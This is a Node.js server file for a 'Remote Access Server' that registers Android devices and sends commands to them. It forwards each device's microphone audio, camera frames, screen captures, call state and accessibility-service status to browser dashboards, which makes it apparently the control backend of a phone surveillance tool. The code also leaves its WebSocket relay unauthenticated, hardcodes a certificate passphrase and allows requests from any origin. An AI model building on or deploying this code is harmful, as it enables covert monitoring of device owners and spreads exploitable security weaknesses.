/**
 * Remote Access Server Gateway
 * Express + WebSocket Server for device management
 */

import express from 'express';
import { WebSocketServer } from 'ws';
import http from 'http';
import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './config.js';
import adminRoutes from './routes/admin.js';
import { socketRegistry } from './services/socketRegistry.js';
import { commandDispatcher } from './services/commandDispatcher.js';
import HealthMonitor from './services/healthMonitor.js';
import { authMiddleware, createToken, verifyToken } from './middleware/auth.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize Express app
const app = express();
const server = http.createServer(app);

// HTTPS server (self-signed cert for Speech Recognition API)
let httpsServer = null;
try {
    const certsDir = path.join(__dirname, '../certs');
    const pfxPath = path.join(certsDir, 'cert.pfx');
    const keyPath = path.join(certsDir, 'key.pem');
    const certPath = path.join(certsDir, 'cert.pem');

    let sslOptions = null;

    if (fs.existsSync(pfxPath)) {
        sslOptions = {
            pfx: fs.readFileSync(pfxPath),
            passphrase: 'temp123',
        };
        console.log('[HTTPS] SSL certificate loaded from certs/cert.pfx');
    } else if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
        sslOptions = {
            key: fs.readFileSync(keyPath),
            cert: fs.readFileSync(certPath),
        };
        console.log('[HTTPS] SSL certificates loaded from certs/');
    }

    if (sslOptions) {
        httpsServer = https.createServer(sslOptions, app);
    } else {
        console.log('[HTTPS] No SSL certs found in certs/ — mic Speech Recognition requires HTTPS');
    }
} catch (e) {
    console.error('[HTTPS] Error loading certs:', e.message);
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// CORS for all environments
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ─── Authentication Routes (public, no middleware) ───

// Login endpoint
app.post('/auth/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            error: 'Username and password are required',
        });
    }

    if (username === config.auth.username && password === config.auth.password) {
        const token = createToken(username);

        res.cookie('auth_token', token, {
            httpOnly: true,
            secure: config.isProduction,
            sameSite: 'strict',
            maxAge: config.auth.tokenExpiry,
            path: '/',
        });

        return res.json({
            success: true,
            message: 'Authentication successful',
        });
    }

    return res.status(401).json({
        success: false,
        error: 'Invalid username or password',
    });
});

// Logout endpoint
app.get('/auth/logout', (req, res) => {
    res.clearCookie('auth_token', { path: '/' });
    res.redirect('/login.html');
});

// Session check endpoint
app.get('/auth/check', (req, res) => {
    const cookies = {};
    const header = req.headers.cookie;
    if (header) {
        header.split(';').forEach(c => {
            const [name, ...rest] = c.trim().split('=');
            cookies[name] = decodeURIComponent(rest.join('='));
        });
    }

    const result = verifyToken(cookies.auth_token);

    if (result.valid) {
        return res.json({ success: true, username: result.username });
    }
    return res.status(401).json({ success: false, error: 'Not authenticated' });
});

// ─── Auth Middleware (protects everything below) ───
app.use(authMiddleware);

// Serve static admin dashboard (protected)
app.use(express.static(path.join(__dirname, '../public')));

// API routes (protected)
app.use('/api', adminRoutes);

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        devices: socketRegistry.getDeviceCount(),
    });
});

// Initialize WebSocket Server on HTTP
const wss = new WebSocketServer({
    server,
    path: '/',
});

// Also attach WebSocket to HTTPS if available
let wssHttps = null;
if (httpsServer) {
    wssHttps = new WebSocketServer({
        server: httpsServer,
        path: '/',
    });
}

console.log('[WebSocket] Server initialized');

/**
 * Safe send — prevents crash if socket is null or closed
 */
function safeSend(ws, data) {
    try {
        if (ws && ws.readyState === ws.OPEN) {
            ws.send(typeof data === 'string' ? data : JSON.stringify(data));
            return true;
        }
    } catch (e) {
        console.error(`[WebSocket] safeSend failed: ${e.message}`);
    }
    return false;
}

/**
 * Broadcast a message to all WebSocket clients (HTTP + HTTPS) except sender
 */
function broadcastToClients(senderWs, msg) {
    const message = typeof msg === 'string' ? msg : JSON.stringify(msg);
    const broadcast = (server) => {
        if (!server) return;
        server.clients.forEach(client => {
            if (client !== senderWs && client.readyState === client.OPEN) {
                client.send(message);
            }
        });
    };
    broadcast(wss);
    broadcast(wssHttps);
}

/**
 * WebSocket connection handler — shared between HTTP and HTTPS servers
 */
function handleWebSocketConnection(ws, req) {
    console.log('[WebSocket] New connection from:', req.socket.remoteAddress);

    let deviceId = null;
    let heartbeatInterval = null;

    // Handle messages
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());

            // Normalize message structure (Android sends 'action', Frontend expects 'type')
            if (data.action && !data.type) {
                data.type = data.action;
            }

            // Inject deviceId if missing (for frontend)
            if (!data.deviceId && deviceId) {
                data.deviceId = deviceId;
            }

            // Handle browser identification
            if (data.type === 'identify') {
                return;
            }

            // Handle device registration
            if (data.type === 'register') {
                deviceId = data.deviceId;
                socketRegistry.register(deviceId, ws, data.metadata || {});

                // Send welcome message
                safeSend(ws, {
                    type: 'registered',
                    deviceId,
                    message: 'Successfully registered',
                });

                // Start heartbeat monitoring
                heartbeatInterval = setInterval(() => {
                    if (!safeSend(ws, { type: 'ping' })) {
                        clearInterval(heartbeatInterval);
                        console.log(`[WebSocket] Ping failed for ${deviceId}, clearing interval`);
                    }
                }, config.websocket.pingInterval);

                return;
            }

            // Handle heartbeat from device
            if (data.type === 'heartbeat') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, {
                        lastHeartbeat: new Date().toISOString(),
                    });
                    safeSend(ws, { type: 'heartbeat_ack' });
                }
                return;
            }

            // Handle heartbeat pong
            if (data.type === 'pong') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, {
                        lastSeen: new Date().toISOString(),
                    });
                }
                return;
            }

            // Handle device info updates
            if (data.type === 'device_info') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, data.info);
                }
                return;
            }

            // Handle mic audio chunks - forward to all browsers
            if (data.type === 'mic_chunk' && deviceId) {
                broadcastToClients(ws, data);
                return;
            }

            // Handle camera frames - forward to all browsers
            if (data.type === 'camera_frame' && deviceId) {
                broadcastToClients(ws, data);
                return;
            }

            // Handle screen frames - forward to all browsers (Remote Control)
            if (data.type === 'screen_frame' && deviceId) {
                broadcastToClients(ws, data);
                return;
            }

            // Handle clean disconnection request
            if (data.type === 'disconnect' && deviceId) {
                console.log(`[WebSocket] Device ${deviceId} requesting clean disconnect`);
                socketRegistry.deleteDevice(deviceId);
                safeSend(ws, { type: 'disconnect_ack' });
                return;
            }

            // Handle command responses
            if (data.replyTo) {
                commandDispatcher.handleResponse(data);
                return;
            }

            // Handle device-pushed status updates (call_state, mic_state, etc.)
            if (['call_state', 'mic_state', 'camera_state'].includes(data.type) && deviceId) {
                socketRegistry.updateMetadata(deviceId, { [data.type]: data.state || data });
                return;
            }

            // Handle accessibility status — forward to all browsers for dashboard alerts
            if (data.type === 'accessibility_status' && deviceId) {
                broadcastToClients(ws, { ...data, deviceId });
                return;
            }

            console.log('[WebSocket] Unknown message type:', data);
        } catch (error) {
            console.error('[WebSocket] Error parsing message:', error);
        }
    });

    // Handle disconnection — REMOVE device from memory immediately
    ws.on('close', () => {
        console.log(`[WebSocket] Client disconnected: ${deviceId || 'unknown'}`);

        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }

        if (deviceId) {
            commandDispatcher.clearDeviceCommands(deviceId);
            socketRegistry.deleteDevice(deviceId);
            console.log(`[WebSocket] Device ${deviceId} removed from registry`);
        }
    });

    // Handle errors — also clean up
    ws.on('error', (error) => {
        console.error(`[WebSocket] Connection error for ${deviceId || 'unknown'}:`, error.message);
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }
        if (deviceId) {
            commandDispatcher.clearDeviceCommands(deviceId);
            socketRegistry.deleteDevice(deviceId);
            console.log(`[WebSocket] Device ${deviceId} removed after error`);
        }
    });
}

// Wire up WebSocket handlers
wss.on('connection', handleWebSocketConnection);

// Initialize and start health monitor
const healthMonitor = new HealthMonitor(socketRegistry);
healthMonitor.start();

// Heartbeat to keep Render server alive (self-ping every 4 minutes)
if (config.isProduction) {
    setInterval(async () => {
        try {
            const res = await fetch(`http://localhost:${config.port}/health`);
            const data = await res.json();
            console.log(`[KeepAlive] Ping OK - ${data.devices} device(s) connected`);
        } catch (err) {
            console.log('[KeepAlive] Self-ping failed:', err.message);
        }
    }, 4 * 60 * 1000); // Every 4 minutes
}

// Start server
server.listen(config.port, () => {
    console.log('='.repeat(50));
    console.log(`🚀 Remote Access Server Running`);
    console.log('='.repeat(50));
    console.log(`📡 HTTP Server: http://localhost:${config.port}`);
    console.log(`🔌 WebSocket: ws://localhost:${config.port}`);
    console.log(`🌍 Environment: ${config.nodeEnv}`);
    console.log(`📊 Admin Dashboard: http://localhost:${config.port}`);
    if (httpsServer) {
        const httpsPort = parseInt(config.port) + 443; // e.g., 3000 → 3443
        httpsServer.listen(httpsPort, () => {
            console.log(`🔒 HTTPS Server: https://localhost:${httpsPort}`);
            console.log(`🎤 Mic/Speech: https://192.168.29.87:${httpsPort}/speak.html`);
        });

        // Set up WebSocket handlers for HTTPS server too
        if (wssHttps) {
            wssHttps.on('connection', (ws, req) => {
                handleWebSocketConnection(ws, req);
            });
        }
    }
    console.log('='.repeat(50));
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[Server] SIGTERM received, shutting down gracefully...');
    server.close(() => {
        console.log('[Server] Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('\n[Server] SIGINT received, shutting down gracefully...');
    server.close(() => {
        console.log('[Server] Server closed');
        process.exit(0);
    });
});
